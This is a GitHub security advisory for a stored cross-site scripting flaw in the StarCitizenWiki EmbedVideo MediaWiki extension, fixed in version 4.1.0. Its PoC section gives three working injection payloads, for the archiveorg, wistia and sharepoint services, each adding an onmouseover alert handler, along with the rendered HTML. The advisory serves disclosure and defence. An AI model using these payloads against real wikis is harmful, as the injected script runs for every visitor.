# [H] StarCitizenWiki Extension Embed Video: Stored XSS via malformed src url with $wgEmbedVideoRequireConsent enabled

## Summary
Severity: High
Advisory: GHSA-5c7p-g73q-rpg5
CVE: CVE-2026-55692
CWE: CWE-79, CWE-80
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-06-19
Source: https://github.com/advisories/GHSA-5c7p-g73q-rpg5
Type: github-advisory

## Affected
- Packagist: `starcitizenwiki/embedvideo` — affected >=0 <4.1.0

## Details
### Summary
With $wgEmbedVideoRequireConsent enabled (the default), the urls for videos are stored in a json-ified data attribute`data-mw-iframeconfig`. When given a malformed url or id, the data-mw-iframeconfig attribute can be escaped via single quotes, allowing for html/javascript injection.

### Details
The sprintf [here](https://github.com/StarCitizenWiki/mediawiki-extensions-EmbedVideo/blob/a573a16d925ee0ea0d34b360856dc8ab0b88f822/includes/EmbedService/EmbedHtmlFormatter.php#L115-L120) adds the iframe config encoded as JSON [here](https://github.com/StarCitizenWiki/mediawiki-extensions-EmbedVideo/blob/a573a16d925ee0ea0d34b360856dc8ab0b88f822/includes/EmbedService/AbstractEmbedService.php#L518). When given a malicious url or id with a single quote, the `$this->getUrl()` call returns an unescaped payload that terminates the data-mw-iframeconfig attribute and allows for injecting attributes, including handlers, into the figure element. The id regex for the `archiveorg` service and the url regexes for the `wistia` and `sharepoint` services allow for single quotes to be introduced.

### PoC
A couple of examples across services
```
Input:
<embedvideo service="archiveorg" id="x' onmouseover='alert(document.domain)' data-x='"></embedvideo>

Renders:
<figure class="embedvideo" data-service="archiveorg" data-mw-iframeconfig="{&quot;src&quot;:&quot;//archive.org/embed/x" onmouseover="alert(document.domain)" data-x="?autoplay=1&quot;}" style="width:640px">
<div class="embedvideo-wrapper" style="height:493px"><div class="embedvideo-consent" data-show-privacy-notice="1">
...
</div>
</figure>
```

```
Input:
{{#ev:wistia|https://wistia.com/medias/x'onmouseover='alert(document.domain)'}}

Renders:
<figure class="embedvideo" data-service="wistia" data-mw-iframeconfig="{&quot;src&quot;:&quot;//fast.wistia.net/embed/iframe/x" onmouseover="alert(document.domain)" ?autoplay="1&quot;}'" style="width:640px">
<div class="embedvideo-wrapper" style="height:360px"><div class="embedvideo-consent" data-show-privacy-notice="1">
...
</div>
</figure>
```

```
{{#ev:sharepoint|https://a.sharepoint.com/sites/x'onmouseover='alert(document.domain)'.aspx}}
```

### Impact
Under the default $wgEmbedVideoRequireConsent = true configuration, any user able to edit a page can inject arbitrary JavaScript into an HTML event handler attribute (e.g. onfocus) via parameter. It requires no interaction (autofires via autofocus) and executes in the wiki origin for every visitor to the page.

## References
- https://github.com/StarCitizenWiki/mediawiki-extensions-EmbedVideo/security/advisories/GHSA-5c7p-g73q-rpg5
- https://github.com/StarCitizenWiki/mediawiki-extensions-EmbedVideo/commit/370156335b325bb81d14d89edf0a1f2643d50a84
- https://github.com/StarCitizenWiki/mediawiki-extensions-EmbedVideo
- https://github.com/StarCitizenWiki/mediawiki-extensions-EmbedVideo/releases/tag/v4.1.0
